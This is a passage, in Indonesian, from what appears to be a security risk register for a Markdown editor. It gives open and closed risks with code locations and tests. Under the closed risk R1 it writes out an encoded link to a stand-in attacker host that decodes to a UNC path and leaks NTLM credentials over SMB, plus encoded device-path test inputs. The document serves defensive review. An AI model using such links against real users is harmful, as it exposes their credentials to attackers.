| R2 | Klik tautan `http(s)`/`mailto` di pratinjau membuka shell **tanpa konfirmasi** (`Process.Start` dengan `UseShellExecute`). Skema lain diabaikan. | `DocumentView.xaml.cs:673-705` | Kode; tidak ada test untuk `OnHyperlink` |
| R3 | Pratinjau tidak membatasi gambar lokal ke folder dokumen (hanya ekspor yang membatasi). Gambar lokal di drive mana pun ditampilkan; tidak ada eksfiltrasi, tetapi dokumen tak tepercaya bisa menampilkan gambar lain di mesin pengguna di layar. | `MarkdownSupport.cs:174-197` | Kode |
| R4 | Dengan "Muat gambar remote" aktif, `http(s)` mengungkap IP dan waktu baca ke penulis dokumen; URL ber-kredensial (`https://user:pw@host`) diteruskan apa adanya. HTML hasil ekspor juga tetap merujuk gambar `http(s)` remote sehingga penerima bisa dilacak. | `MarkdownSupport.cs:145-147, 237-240` | Kode; test `HttpVariants_*` |
| R5 | Ekspor: cabang symlink-di-dalam-menunjuk-ke-luar tidak diuji. Tipe gambar ditentukan dari **ekstensi**, bukan isi (berkas bernama `.png` berisi data lain tetap di-embed sebagai `image/png`; dampaknya terbatas pada `<img>`, belum diverifikasi di peramban). | `MarkdownSupport.cs:328, 333-334` | Kode |
| R6 | Penulisan melalui symlink menimpa **file target** (di folder lain), bukan link. Disengaja (`ResolveLinkTarget`), tetapi dokumen yang di-symlink ke file sensitif akan menimpanya saat disimpan. | `TextFileIO.cs:143` | Test symlink hanya jalan bila boleh membuat symlink |
| R7 | Pipe single-instance hanya dilindungi `CurrentUserOnly`; proses lain milik pengguna yang sama dapat membuka path absolut apa pun sebagai tab (tanpa eksekusi). Nama pipe dapat diprediksi (SID + sesi). Penolakan pengguna lain tidak diuji. | `SingleInstance.cs:61-62, 104-105` | Kode |
| R8 | Pembacaan, dekode, hash, ekspor, **Cetak langsung (Ctrl+P)**, dan regex berjalan **sinkron di UI thread**: file besar atau regex lambat membekukan UI (sampai 500 MB dibaca ke memori; regex sampai ~4 dtk + 2 dtk). Kehabisan memori (OOM) diperlakukan berbeda per jalur. Pratinjau utama: pada render sinkron (dokumen < 100 rb karakter) OOM sengaja lolos dan menutup aplikasi lewat jalur fatal; di `RenderInBackground` (>= 100 rb karakter) OOM ikut ditangkap dan ditampilkan sebagai dokumen galat. **Cetak langsung** (`Print_Executed`) mengecualikan OOM dari `catch`, jadi OOM saat membuat dokumen, menghitung halaman, atau mencetak jatuh ke jalur fatal (galat lain: pesan "Gagal mencetak."). **Pratinjau Cetak**: `Guard` pada `PreviewBuild` menangkap semua galat termasuk OOM, siklus menjadi `Failed`, panel menampilkan "Memori tidak cukup untuk menyusun pratinjau dokumen ini." dan galat dicatat; OOM saat membuat jendelanya ditangkap `PrintPreview_Executed` dengan pesan ramah. Tombol Cetak di jendela pratinjau (`dialog.PrintDocument`, sinkron) tidak menangkap OOM (jalur fatal). Dokumen Markdown sangat besar: WPF menata satu `FlowDocument` raksasa secara superlinear dan UI bisa tak merespons dengan memori sampai sekitar 1 GB (terukur untuk pratinjau utama; angka di README, Batasan yang diketahui; **belum diukur** untuk Pratinjau Cetak). | `MainWindow.xaml.cs:19-20, 596-600, 616-621`, `SearchEngine.cs:24-25`, `DocumentView.xaml.cs:364, 406, 465, 475`, `PreviewBuild.cs:211-222`, `PrintPreviewWindow.xaml.cs:137-138, 449` | Kode; test Guard/OOM di `PreviewBuildTests.cs:468` (hanya pratinjau); jalur OOM lain tidak diuji |
| R9 | Dokumen yang belum disimpan hilang pada galat fatal: hanya path/mode/caret yang masuk sesi; tidak ada penyimpanan otomatis atau pemulihan draf (README). | `MainWindow.xaml.cs:215-232`, README Batasan | Kode |
| R10 | `crash.log` berisi path dan stack trace dalam teks biasa. | `CrashLog.cs:41-43` | Kode |
| R11 | Pengecekan kesamaan kunci tema dan pengujian UI utama (`MainWindow`, `App`) tidak otomatis; regresi di sana tidak tertangkap test. Lihat [TESTING.md](TESTING.md#yang-tidak-teruji). | - | Kode |
| R12 | Dependensi pihak ketiga (Markdig.Wpf 0.5.0.1, AvalonEdit 6.3.1.120, xUnit dkk.) dipasang dengan versi tetap; tidak ada pemindaian kerentanan dependensi atau CI di repo. Hasil publish tidak ditandatangani dalam skrip yang ada (belum diverifikasi). | `Makdon.csproj:35-36`, tidak ada `.github/` | Kode |
| R13 | Perilaku pustaka tidak diverifikasi di repo: bahwa Markdig.Wpf mengabaikan HTML mentah, bahwa `MarkdownPipeline` aman dipakai bersamaan dari thread latar dan UI (kini juga oleh parse snapshot cetak di thread latar, yang bisa berjalan bersamaan dengan render pratinjau utama). | `DocumentView.xaml.cs:401`, `PrintLayout.cs:99` | **Belum diverifikasi** |

## 4. Risiko yang sudah ditutup

| # | Risiko semula | Kontrol sekarang | Lokasi kode | Test |
| --- | --- | --- | --- | --- |
| R1 | **Klik tautan relatif/UNC ke berkas `.md` dapat memicu akses jaringan.** `OnHyperlink` menggabungkan `Path.Combine(baseDir, Uri.UnescapeDataString(url))` lalu memanggil `File.Exists(target)` **sebelum** cek ekstensi dan tanpa `IsAllowedLocalPath`. Vektor semula: tautan relatif ter-percent-encode seperti `[x](%5C%5Cattacker.example%5Cshare%5Cx.md)` atau `%2F%2Fhost%2Fshare%2Fx.md` didekode menjadi path UNC sehingga satu klik memicu koneksi SMB (dan pengiriman kredensial NTLM). Tautan `file:///C:/x.md` absolut juga tidak pernah berhasil (string URL mentah digabung ke `Path.Combine`). | Resolusi dipisah ke `MarkdownSupport.ResolveLinkTarget(baseDir, url, out anchor)` yang **tidak melakukan I/O**. Urutan: tautan `file:` tanpa host dikonversi lewat `Uri.LocalPath` (yang berhost atau UNC ditolak); tautan lain didekode lalu digabung dengan folder dokumen; path berawalan `\?\` atau `\.\` (juga dengan `/`) ditolak sebelum dan sesudah `GetFullPath`; ekstensi harus markdown; lalu `IsAllowedLocalPath` (UNC hanya di share yang sama dengan dokumen, huruf drive tetap boleh). `OnHyperlink` memanggil `File.Exists` hanya bila helper mengembalikan path. `#anchor` dan `file.md#anchor` tetap didukung. | `MarkdownSupport.cs:361-412` (`ResolveLinkTarget`, `IsDevicePath`), `DocumentView.xaml.cs:707-711` | `LinkResolutionTests.cs`: `UncAndDevicePaths_AreRejected` (`%5C%5Chost...`, `%2F%2Fhost...`, `\?\UNC\...` ter-encode, `\.\pipe\x`), `SameShareDocument_StillRejectsOtherShares_AndDevicePaths`, `DocumentOnShare_AllowsLinksOnTheSameShare`, `LocalRelativeAndDriveLinks_Resolve`, `Anchor_IsSplitFromPath`, `FileUriWithoutHost_ResolvesToLocalPath`, `FileUriWithHost_IsRejected`, `NonMarkdown_IsRejected`, `NullEmptyAndAnchorOnly_ReturnNull`. Pembungkus `OnHyperlink` sendiri tetap tanpa test, dan perilaku terhadap share SMB nyata tidak diuji |
